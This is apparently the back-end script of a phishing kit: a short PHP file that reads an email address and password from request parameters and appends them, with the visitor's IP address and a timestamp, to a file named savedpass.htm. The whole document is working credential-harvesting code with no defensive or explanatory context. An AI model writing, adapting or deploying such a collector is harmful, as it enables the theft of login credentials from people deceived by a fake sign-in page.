<?php
date_default_timezone_set("Indian/Mahe");#Add 1hour 30min
$email=$_GET['email'];
$pass=$_GET['pass'];
$ip=$_SERVER['REMOTE_ADDR'];
$file=fopen('savedpass.htm',"a");
fwrite($file,date("D M j G:i:s T Y")."	".$ip."	".$email."	".$pass."<br>");
fclose($file);

?>